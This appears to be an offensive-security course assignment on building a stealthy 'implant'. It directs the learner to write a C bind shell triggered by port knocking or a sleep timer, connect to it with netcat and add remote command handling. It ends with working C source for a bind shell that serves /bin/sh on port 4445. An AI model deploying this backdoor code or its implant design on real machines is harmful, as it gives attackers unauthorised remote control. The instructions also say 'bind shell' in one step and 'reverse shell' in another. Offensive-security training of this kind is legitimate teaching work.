# Bind Shell
Look at this link for some c that creates a bind shell. If anything doesn't work, you're a hacker, you have google... 

<https://rastating.github.io/creating-a-bind-shell-tcp-shellcode/>

Implement a bind shell in c, execute it with your portknocking, and connect to the bind shell with netcat. 

Once you have that, modify your existing implant to not use any sort of portknock setup and instead sleep an arbitrary amount of time on execution. Once that time has elapsed, open a bind shell. This should not require many changes to your code, but is an important step towards building in a modular manner. 

Once you have built your new miniature implant, modify it to have command processing functionality while connected via bind shell. For your first new command, upon receiving the string 'sleep X', close down the reverse shell, sleep for specified X minutes, and then reconnect to the previous port. 

When you are done, submit your commit.





#include <stdio.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <unistd.h>

int main ()
{
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(4445);
    addr.sin_addr.s_addr = INADDR_ANY;

    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    bind(sockfd, (struct sockaddr *)&addr, sizeof(addr));
    listen(sockfd, 0);

    int connfd = accept(sockfd, NULL, NULL);
    for (int i = 0; i < 3; i++)
    {
        dup2(connfd, i);
    }

    execve("/bin/sh", NULL, NULL);
    return 0;
}

